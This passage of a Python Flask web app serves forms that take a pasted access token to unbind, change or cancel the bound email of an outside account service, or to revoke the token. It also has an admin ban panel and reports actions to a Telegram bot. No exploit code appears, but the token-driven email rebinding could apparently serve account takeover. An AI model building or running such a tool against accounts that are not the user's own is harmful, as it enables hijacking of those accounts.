<p style="color:#00ff0088;text-align:center;font-size:12px;margin-bottom:20px">✓ Enter OTP sent to {{{{ new_email }}}}</p>
<form method="POST" action="/change-email-otp">
<div class="input-group"><label>OTP CODE (NEW EMAIL)</label><input type="text" name="otp2" placeholder="Enter OTP from New Email" required></div>
<button type="submit" class="btn">CONFIRM & CHANGE</button>
<input type="hidden" name="step" value="3">
<input type="hidden" name="access_token" value="{{{{ access_token }}}}">
<input type="hidden" name="current_email" value="{{{{ current_email }}}}">
<input type="hidden" name="new_email" value="{{{{ new_email }}}}">
<input type="hidden" name="otp1" value="{{{{ otp1 }}}}">
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

# ============ UNBIND ============
@app.route('/unbind', methods=['GET', 'POST'])
def unbind_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        sec_code = request.form.get('sec_code')
        current_email = request.form.get('current_email')
        otp = request.form.get('otp')
        
        if not access:
            return render_template_string(UNBIND_HTML, error="Access Token required!")
        
        if sec_code:
            success, msg = unbind_with_sec(access, sec_code)
        elif current_email and otp:
            success, msg = unbind_no_sec(access, current_email, otp)
        else:
            return render_template_string(UNBIND_HTML, error="Please provide Security Code OR OTP method!")
        
        if success:
            send_to_telegram(f"🔓 <b>UNBIND REQUEST</b>\n\nMethod: {'SEC' if sec_code else 'OTP'}")
            return render_template_string(UNBIND_HTML, success=msg)
        return render_template_string(UNBIND_HTML, error=msg)
    return render_template_string(UNBIND_HTML)

UNBIND_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Unbind</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:550px;padding:20px"><div class="card">
<h1>UNBIND EMAIL</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if success %}}<div class="success">{{{{ success }}}}</div>{{% endif %}}
<form method="POST" action="/unbind">
<div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token" required></div>
<div style="margin-bottom:15px">
<label style="display:block;color:#ff000088;font-size:11px;margin-bottom:6px;text-transform:uppercase">METHOD</label>
<select name="method" style="width:100%;padding:12px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666;font-size:14px" onchange="toggleMethod(this.value)">
<option value="sec">SECURITY CODE</option>
<option value="otp">OTP METHOD</option>
</select>
</div>
<div id="secFields">
<div class="input-group"><label>SECURITY CODE</label><input type="text" name="sec_code" placeholder="Enter Security Code"></div>
</div>
<div id="otpFields" style="display:none">
<div class="input-group"><label>CURRENT EMAIL</label><input type="email" name="current_email" placeholder="Enter Current Bound Email"></div>
<div class="input-group"><label>OTP CODE</label><input type="text" name="otp" placeholder="Enter OTP"></div>
</div>
<button type="submit" class="btn">UNBIND</button>
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div>
<script>
function toggleMethod(v){document.getElementById('secFields').style.display=v==='sec'?'block':'none';document.getElementById('otpFields').style.display=v==='otp'?'block':'none'}
</script>
</body></html>"""

# ============ REVOKE ============
@app.route('/revoke', methods=['GET', 'POST'])
def revoke_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        if not access:
            return render_template_string(REVOKE_HTML, error="Access Token required!")
        success, msg = revoke_token(access)
        if success:
            send_to_telegram(f"🔑 <b>TOKEN REVOKED</b>")
            return render_template_string(REVOKE_HTML, success=msg)
        return render_template_string(REVOKE_HTML, error=msg)
    return render_template_string(REVOKE_HTML)

REVOKE_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Revoke</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>REVOKE TOKEN</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if success %}}<div class="success">{{{{ success }}}}</div>{{% endif %}}
<form method="POST" action="/revoke">
<div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token to Revoke" required></div>
<button type="submit" class="btn">REVOKE</button>
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

# ============ CANCEL ============
@app.route('/cancel-bind', methods=['GET', 'POST'])
def cancel_bind_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        if not access:
            return render_template_string(CANCEL_HTML, error="Access Token required!")
        success, msg = cancel_bind(access)
        if success:
            send_to_telegram(f"❌ <b>BIND CANCELLED</b>")
            return render_template_string(CANCEL_HTML, success=msg)
        return render_template_string(CANCEL_HTML, error=msg)
    return render_template_string(CANCEL_HTML)

CANCEL_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Cancel</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>CANCEL BIND</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if success %}}<div class="success">{{{{ success }}}}</div>{{% endif %}}
<form method="POST" action="/cancel-bind">
<div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token" required></div>
<button type="submit" class="btn">CANCEL</button>
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

# ============ ADMIN ============
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        key = request.form.get('key')
        if key == ADMIN_KEY:
            session['admin'] = True
            return redirect('/admin')
        return render_template_string(ADMIN_LOGIN_HTML, error="INVALID ADMIN KEY!")
    return render_template_string(ADMIN_LOGIN_HTML)

ADMIN_LOGIN_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:450px;padding:20px"><div class="card">
<h1>ADMIN PANEL</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
<form method="POST" action="/admin-login">
<div class="input-group"><label>ADMIN KEY</label><input type="password" name="key" placeholder="ENTER ADMIN KEY" required></div>
<button type="submit" class="btn">ACCESS</button>
</form>
</div></div></body></html>"""

@app.route('/admin')
def admin():
    if not session.get('admin'):
        return redirect('/admin-login')
    users = User.query.order_by(User.display_id).all()
    banned_ips = BannedIP.query.all()
    banned_count = User.query.filter_by(is_banned=True).count()
    return render_template_string(ADMIN_HTML, users=users, banned_ips=banned_ips, banned_count=banned_count)

ADMIN_HTML = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{background:#0a0a0a;min-height:100vh;color:#ff6666}
.navbar{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;border-bottom:1px solid #ff000033}
.navbar h1{font-size:20px;color:#ff0000}
.navbar a{color:#ff000088;text-decoration:none;padding:8px 16px;border:1px solid #ff000033;border-radius:8px}
.container{padding:25px;max-width:1200px;margin:0 auto}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:25px}
.stat-card{background:rgba(255,0,0,0.03);border:1px solid #ff000022;border-radius:15px;padding:20px;text-align:center}
.stat-card h3{color:#ff000088;font-size:11px}
.stat-card .value{color:#ff0000;font-size:28px;font-weight:bold}
.section{background:rgba(255,0,0,0.03);border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #ff000022;overflow-x:auto}
.section h2{color:#ff0000;font-size:16px;margin-bottom:15px}
table{width:100%;border-collapse:collapse;font-size:12px}
th,td{padding:10px;text-align:left;border-bottom:1px solid #ff000011;color:#ff6666}
th{color:#ff000088}
.ban-btn{background:#ff333355;border:none;padding:4px 12px;border-radius:6px;color:#ff6666;cursor:pointer}
.unban-btn{background:#33ff3355;border:none;padding:4px 12px;border-radius:6px;color:#66ff66;cursor:pointer}
.ip-ban-btn{background:#ff880055;border:none;padding:4px 12px;border-radius:6px;color:#ff8866;cursor:pointer}
</style>
</head>
<body>
<div class="navbar"><h1>ADMIN PANEL</h1><a href="/logout">LOGOUT</a></div>
<div class="container">
<div class="stats">
<div class="stat-card"><h3>TOTAL USERS</h3><div class="value">{{ users|length }}</div></div>
<div class="stat-card"><h3>BANNED</h3><div class="value">{{ banned_count }}</div></div>
<div class="stat-card"><h3>BANNED IPS</h3><div class="value">{{ banned_ips|length }}</div></div>
</div>
<div class="section"><h2>USERS</h2>
<table><tr><th>ID</th><th>USERNAME</th><th>IP</th><th>DEVICE</th><th>JOINED</th><th>STATUS</th><th>ACTION</th></tr>
{% for u in users %}
<tr>
<td>{{ u.display_id }}</td><td>{{ u.username or '-' }}</td><td>{{ u.ip or '-' }}</td><td>{{ (u.device or '-')[:30] }}</td>
<td>{{ u.joined_at.strftime('%Y-%m-%d') if u.joined_at else '-' }}</td>
<td>{{ 'ACTIVE' if not u.is_banned else 'BANNED' }}</td>
<td>
{% if u.is_banned %}
<form method="POST" action="/admin/unban" style="display:inline;"><input type="hidden" name="user_id" value="{{ u.id }}"><button class="unban-btn">UNBAN</button></form>
{% else %}
<form method="POST" action="/admin/ban" style="display:inline;"><input type="hidden" name="user_id" value="{{ u.id }}"><button class="ban-btn">BAN</button></form>
<form method="POST" action="/admin/ban-ip" style="display:inline;"><input type="hidden" name="ip" value="{{ u.ip }}"><button class="ip-ban-btn">IP BAN</button></form>
{% endif %}
</td>
</tr>
{% endfor %}
</table></div>
<div class="section"><h2>BANNED IPS</h2>
<table><tr><th>IP</th><th>BANNED AT</th><th>ACTION</th></tr>
{% for b in banned_ips %}
<tr>
<td>{{ b.ip }}</td><td>{{ b.banned_at.strftime('%Y-%m-%d %H:%M') if b.banned_at else '-' }}</td>
<td><form method="POST" action="/admin/unban-ip"><input type="hidden" name="ip" value="{{ b.ip }}"><button class="unban-btn">UNBAN</button></form></td>
</tr>
{% endfor %}
</table></div>
</div>
</body></html>"""

@app.route('/admin/ban', methods=['POST'])
def admin_ban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = db.session.get(User, request.form.get('user_id'))
    if user:
        user.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 <b>USER BANNED</b>\n\nID: {user.display_id}")
    return redirect('/admin')

@app.route('/admin/unban', methods=['POST'])
def admin_unban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = db.session.get(User, request.form.get('user_id'))
    if user:
        user.is_banned = False
        db.session.commit()
    return redirect('/admin')

@app.route('/admin/ban-ip', methods=['POST'])
def admin_ban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    if ip and not is_ip_banned(ip):
        db.session.add(BannedIP(ip=ip))
        user = User.query.filter_by(ip=ip).first()
        if user:
            user.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 <b>IP BANNED</b>\n\nIP: {ip}")
    return redirect('/admin')

@app.route('/admin/unban-ip', methods=['POST'])
def admin_unban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    banned = BannedIP.query.filter_by(ip=ip).first()
    if banned:
        db.session.delete(banned)
        db.session.commit()
    return redirect('/admin')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/health')
def health():
    return "OK", 200

@app.route('/<path:path>')
def catch_all(path):
    if 'admin' in path or path in ['login','dashboard','check-bind','unbind','revoke','cancel-bind']:
        return redirect('/')
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
